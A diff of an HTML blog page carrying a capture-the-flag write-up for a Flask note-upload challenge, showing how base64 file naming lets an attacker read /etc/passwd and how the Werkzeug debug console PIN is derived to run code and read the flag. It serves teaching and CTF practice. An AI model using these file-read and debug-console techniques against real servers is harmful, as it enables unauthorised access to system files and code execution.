-      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
-      <line x1="8" y1="12" x2="16" y2="12"></line>
-   </svg></a></h3>
-<p>We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named <code>abc.txt</code> with content <code>abcdefg</code>, the file will be saved as <code>YWJjZGVmZw==</code> as the tite, with the content as <code>abcdefg</code>.</p>
-<p>Observation 1: If the file is not uploaded before, you cannot retrieve the file. Also, if the file already existed on the server, the file would not be uploaded and the original file will be retained in the server. For example, if a file named <code>flag.txt</code> is already on the server, retrieving <code>flag.txt</code> will return an error as the file was not uploaded.</p>
+				<h2 id="note-service">Note-Service<a href="#note-service" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="-observation">🫣 Observation<a href="#-observation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We see a very simple flask website with file upload and download function. When you upload a file on the website, it will save the file and change the file name as the base64 of the content&rsquo;s first 50 bytes. Meaning if I uploaded a file named <code>abc.txt</code> with content <code>abcdefg</code>, the file will be saved as <code>YWJjZGVmZw==</code> as the file name, with the content as <code>abcdefg</code>.</p>
+<p>Observation 1: If the file is not uploaded before, you cannot retrieve the file. Also, if the file already existed on the server, the uploaded file will not replace the original file.</p>
 <p>But why does these matter? Let&rsquo;s check out a snippet of the backend for the upload file and see where the vulnerability lies,</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>]) <span style="color:#75715e">#11</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>(): <span style="color:#75715e">#12</span>
@@ -220,13 +120,9 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: <span style="color:#75715e">#23</span>
 </span></span><span style="display:flex;"><span>            open(note_title, <span style="color:#e6db74">&#34;wb&#34;</span>)<span style="color:#f92672">.</span>write(note_content) <span style="color:#75715e">#24</span>
 </span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Your file has been written to! It has been saved with the title: </span><span style="color:#e6db74">{</span>note_title<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>) <span style="color:#75715e">#25</span>
-</span></span></code></pre></div><p>Notice Line #17? An array <code>uploaded_files</code> appends the title no matter if the file existed already on the server or not! Meaning even if a file already existed on the server before, it will not replace the file with the one you uploaded. However you can retrieve the file originally on the server.</p>
+</span></span></code></pre></div><p>Notice Line #17? An array <code>uploaded_files</code> appends the file name no matter if the file existed already on the server or not! Meaning even if a file already existed on the server before, it will not replace the file with the one you uploaded. However you now can retrieve the file originally on the server.</p>
 <p>Observation 2: VERY IMPORTANT! Flask debug is on! and https://&lt;some.coolurl.com&gt;/console is out in the public!!! If you manage to cause an error (Just try to retrieve an empty file), you will get a snippet of the source code around the line the error was thrown. Most importantly, the path the backend server is in the error logs! From this, you will know the python script is located at <code>/a/very/strange/working/directory/server.py</code>! (sus!)</p>
-<h3 id="-think-process">🧠 Think process<a href="#-think-process" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-      stroke-linecap="round" stroke-linejoin="round">
-      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
-      <line x1="8" y1="12" x2="16" y2="12"></line>
-   </svg></a></h3>
+<h3 id="-think-process">🧠 Think process<a href="#-think-process" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>With all those observations, An idea comes to my mind. Could we access ANY files other than the uploaded one? The answer is YES! (With a few exceptions). If we want to retrieve <code>/etc/passwd</code>, how would we do it?</p>
 <p>First, we would need to add <code>/etc/passwd</code> in the array <code>uploaded_files</code>.</p>
 <p>Check out this snippet of the server.py code:</p>
@@ -240,14 +136,10 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;input.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
 </span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     f<span style="color:#f92672">.</span>write(payload)
 </span></span></code></pre></div><p>Nice! Upload <code>input.bin</code> and it will show the file already existed! But since <code>//etc/passwd</code> is in the <code>uploaded_files</code> array, we could access <code>//etc/passwd</code> and see the content of file!</p>
-<p>&laquo; PHOTO OF PASSWD &raquo;</p>
+<p><img src="/images/etc-passwd.jpeg" alt="Photo of passwd"></p>
 <p>This means as long as the filepath is valid base64 string, we could access it! Nice! Let&rsquo;s try to retrieve <code>flag.txt</code> then!</p>
 <p>NOPE! Since <code>flag.txt</code> has a <code>.</code> in the title, it is an invalid base64 string. Not that easy huh&hellip; damn it!</p>
-<h3 id="solution">Solution<a href="#solution" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-      stroke-linecap="round" stroke-linejoin="round">
-      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
-      <line x1="8" y1="12" x2="16" y2="12"></line>
-   </svg></a></h3>
+<h3 id="solution">Solution<a href="#solution" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>I stumble on this article about <a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">Werkzeug Console PIN Exploit</a>. tldr you need these variables to get the console PIN:</p>
 <pre tabindex="0"><code>probably_public_bits = [
     username,
@@ -371,11 +263,7 @@ jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin
 </code></pre><p>and if you enter it in the pin prompt, IT WORKS!! OMG! We just need to retrieve le flag. Inside the debug console, We enter this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
 </span></span><span style="display:flex;"><span>RCR{rC3_Just_t0_ReaD_4_fiL3<span style="color:#960050;background-color:#1e0010">?</span>}
-</span></span></code></pre></div><h3 id="other-useful-resource-for-werkzeug-console-pin-exploit">Other useful resource for Werkzeug Console PIN Exploit:<a href="#other-useful-resource-for-werkzeug-console-pin-exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-      stroke-linecap="round" stroke-linejoin="round">
-      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
-      <line x1="8" y1="12" x2="16" y2="12"></line>
-   </svg></a></h3>
+</span></span></code></pre></div><h3 id="other-useful-resource-for-werkzeug-console-pin-exploit">Other useful resource for Werkzeug Console PIN Exploit:<a href="#other-useful-resource-for-werkzeug-console-pin-exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>DANGEROUS Python Flask Debug Mode Vulnerabilities - John Hammond
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
       <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/jwBRgaIRdgs?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
@@ -383,13 +271,13 @@ jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin
 </p>
 
 			</div>
-			
+			<div class="human posts"><a href="https://brainmade.org/" target="_blank" rel="external noreferrer noopener"><abbr title=""><svg fill="#fff" width="128" height="40" viewBox="0 0 128 40" xmlns="http://www.w3.org/2000/svg"><path d="M26.306 39.391H11.665a1.28 1.28 0 0 1-1.28-1.28v-3.838H6.399a1.28 1.28 0 0 1-1.28-1.28v-5.336l-4.41-2.198a1.28 1.28 0 0 1-.493-1.855l4.904-7.357v-2.175C5.12 6.298 11.422 0 19.194 0s14.073 6.3 14.075 14.071c-.316 13.912-5.38 11.758-5.59 17.023l-.093 7.018a1.3 1.3 0 0 1-.375.905 1.27 1.27 0 0 1-.905.375zm-13.361-2.559h12.082l.143-7.27c-.132-3.329 5.858-4.122 5.54-15.368-.179-6.356-5.157-11.635-11.515-11.635S7.68 7.713 7.679 14.071v2.559c-.001.253-.075.5-.215.71l-4.315 6.471 3.822 1.91a1.28 1.28 0 0 1 .708 1.145v4.848h3.987a1.28 1.28 0 0 1 1.28 1.28z"/><path d="M20.186 29.111v-9.644c.059 0 .118.009.177.009 4.885-.006 8.525-4.506 7.511-9.284a1.19 1.19 0 0 0-.911-.911 7.67 7.67 0 0 0-9.049 5.67l-.033-.036a7.66 7.66 0 0 0-7.03-2.085 1.19 1.19 0 0 0-.911.91c-1.014 4.777 2.627 9.277 7.51 9.284.118 0 .246-.014.369-.02v6.106zm1.419-16.072a5.33 5.33 0 0 1 4.062-1.553 5.33 5.33 0 0 1-5.614 5.615 5.3 5.3 0 0 1 1.552-4.061zm-7.904 6.057a5.3 5.3 0 0 1-1.559-4.061 5.323 5.323 0 0 1 5.614 5.615 5.3 5.3 0 0 1-4.055-1.554m38.419-6.79q0 2.346-1.567 3.63-1.567 1.282-4.351 1.283h-7.669V0h7.016q2.807 0 4.242 1.1 1.446 1.087 1.446 3.226 0 1.467-.729 2.481-.718 1.002-2.197 1.357 1.86.244 2.828 1.32.979 1.063.979 2.823zm-4.112-7.491q0-1.161-.663-1.65-.652-.488-1.947-.488h-3.655v4.265h3.677q1.36 0 1.968-.525.62-.537.62-1.601m.892 7.209q0-2.42-3.089-2.42h-4.069v4.938h4.188q1.545 0 2.252-.624.718-.635.718-1.894m16.26 5.194-3.557-6.538h-3.764v6.538H54.63V0h7.658q2.741 0 4.231 1.332 1.49 1.32 1.49 3.8 0 1.808-.913 3.128-.914 1.308-2.47 1.723l4.144 7.235zm-.381-11.94q0-2.481-2.828-2.481h-4.112v5.083h4.199q1.349 0 2.045-.684.696-.685.696-1.919m16.785 11.94-1.36-4.399h-5.841l-1.359 4.399h-3.209L75.386 0h3.785l5.569 17.219zM77.278 2.651l-.066.269q-.109.44-.261 1.002c-.152.563-.725 2.436-1.871 6.184h4.405l-1.512-4.949-.468-1.662zm9.551 14.567V0h3.209v17.219zm15.53 0L95.681 3.959q.196 1.931.196 3.104v10.155h-2.849V0h3.666l6.777 13.37q-.196-1.846-.196-3.361V0h2.85v17.219zM52.63 39.375V28.331q.011-.351.115-3.015-.818 3.257-1.209 4.541l-2.925 9.518h-2.418l-2.925-9.518-1.232-4.541q.139 2.809.139 3.717v10.342h-3.017V22.313h4.548l2.902 9.543.253.92.553 2.289.725-2.736 2.983-10.015h4.526v17.063zm17.64 0-1.44-4.359h-6.184l-1.44 4.359h-3.397l5.919-17.063h4.007l5.896 17.063zm-4.537-14.434-.069.267q-.115.436-.277.993c-.162.557-.767 2.414-1.98 6.128h4.663l-1.601-4.905-.495-1.647zm24.577 5.776q0 2.64-.99 4.614-.979 1.961-2.787 3.003-1.796 1.042-4.122 1.042h-6.564V22.313h5.873q4.099 0 6.345 2.18 2.245 2.167 2.245 6.224m-3.42 0q0-2.748-1.359-4.19-1.359-1.453-3.881-1.453h-2.407v11.54h2.879q2.188 0 3.478-1.586t1.29-4.311m6 8.659V22.313h12.759v2.761h-9.362v4.287h8.66v2.761h-8.66v4.492h9.835v2.761zm15.75 0v-3.693h3.328v3.693zm12.445-12.149q2.082 0 3.662.781 1.58.78 2.422 2.235.833 1.454.833 3.393 0 2.98-1.845 4.676Q124.302 40 121.085 40q-3.208 0-5.005-1.688-1.798-1.688-1.798-4.695c0-3.007.606-3.57 1.817-4.694q1.817-1.696 4.986-1.696m0 2.702q-2.157 0-3.378.97-1.23.97-1.23 2.72 0 1.777 1.22 2.747 1.211.97 3.388.97 2.195 0 3.462-.988 1.258-.997 1.258-2.711 0-1.778-1.23-2.738-1.23-.97-3.491-.97m6.725-13.402-5.062 2.935v3.107h5.062v2.648h-13.331v-6.322q0-2.261 1.031-3.491 1.022-1.23 2.942-1.23 1.4 0 2.422.754 1.012.754 1.334 2.038l5.601-3.42zm-9.244.314q-1.92 0-1.921 2.334v3.393h3.936v-3.465q0-1.113-.53-1.688t-1.486-.575m7.249-10.915a6.5 6.5 0 0 0-.313-2.002q-.321-.969-.814-1.499h-1.845v3.088h-2.063V0h4.901q1.088 1.005 1.703 2.622a9.4 9.4 0 0 1 .615 3.375q0 3.088-1.798 4.748-1.808 1.661-5.119 1.661-3.292 0-5.043-1.67-1.76-1.67-1.76-4.803 0-4.452 3.473-5.664l.776 2.442q-1.012.395-1.533 1.238-.52.844-.52 1.984 0 1.867 1.192 2.837t3.416.97q2.261 0 3.501-.997 1.23-1.005 1.23-2.818z"/></svg></abbr></a></div>
 
 <div class="related-posts thin">
 	<h2></h2>
 	<ul>
 	
-	<li><a href="/en/posts/rcr-writeup/3-rsa/">3 RSA</a></li>
+	<li><a href="/en/posts/rcr-writeup/3-rsa/">3-RSA</a></li>
 	
 	<li><a href="/en/posts/my-first-post/">My First Post</a></li>
 	
@@ -399,21 +287,25 @@ jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin
 		</article>
 		<div class="post-nav thin">
 			<a class="prev-post" href="http://localhost:1313/en/posts/rcr-writeup/3-rsa/">
-				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right">
-      <line x1="5" y1="12" x2="19" y2="12"></line>
-      <polyline points="12 5 19 12 12 19"></polyline>
-   </svg></span><br><span>3 RSA</span>
+				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>3-RSA</span>
 			</a>
 		</div>
 		<div id="comments" class="thin"></div>
 	</main>
+
 <footer id="site-footer" class="section-inner thin animated fadeIn faster">
-<p>
-	&copy; 2025 <a href="http://localhost:1313/">Gabriel Yip</a>
-	&#183;  <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a>&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
-	&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a></p></footer>
-<script async src="http://localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script><script async src="http://localhost:1313/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js" integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin="anonymous"></script><script id="MathJax-script" type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" crossorigin="anonymous"></script>
-<script type="text/javascript" id="MathJax-script-helper" async src="http://localhost:1313/js/mathjax-assistant.min.ca29e9d446b2a6cb6c6e3eb0d47e9693f5c306c146eaccb43047afbf31b07a6f.js" integrity="sha256-yinp1Eaypstsbj6w1H6Wk/XDBsFG6sy0MEevvzGwem8=" crossorigin="anonymous"></script>
+	<p>
+		&copy; 2025 <a href="http://localhost:1313/">Gabriel Yip</a>
+		&#183;  <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a>
+		&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+		&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a></p>
+
+</footer>
+<script async src="http://localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script><script async src="http://localhost:1313/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js" integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin="anonymous"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+
+<script type="text/javascript" id="MathJax-script" async src="http://localhost:1313/js/mathjaxs.min.ca29e9d446b2a6cb6c6e3eb0d47e9693f5c306c146eaccb43047afbf31b07a6f.js" integrity="sha256-yinp1Eaypstsbj6w1H6Wk/XDBsFG6sy0MEevvzGwem8=" crossorigin="anonymous"></script>
+
 </body>
+
 </html>
